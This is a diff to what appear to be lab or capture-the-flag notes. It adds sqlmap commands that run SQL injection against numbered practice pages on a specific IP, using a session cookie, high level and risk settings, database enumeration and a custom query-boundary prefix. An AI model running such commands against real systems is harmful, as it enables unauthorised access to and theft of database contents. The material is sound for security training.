@@ -37,6 +37,12 @@ un" --level 5 --risk 3 -p id --batch --threads 10 --dbms=mysql --dbs
 # Non-standard boundaries
 
 ```bash
-sqlmap -u "http://83.136.254.47:49729/case6.php?col=id" --cookie="cookie=XSSisF  
-un" --level 5 --risk 3 -p col --batch --threads 10 --dbms=mysql --dbs
+sqlmap -u "http://83.136.254.47:49729/case6.php?col=id" --cookie="cookie=XSSisFun" --level 5 --risk 3 -p col --batch --threads 10 --dbms=mysql --dbs --prefix='`)'
+```
+
+# UNION SQLi with adjustments
+
+```bash
+sqlmap -u "http://83.136.254.47:49729/case7.php?id=1" --cookie="cookie=XSSisF  
+un" --level 5 --risk 3 -p id --batch --threads 10 --dbms=mysql --dbs
 ```
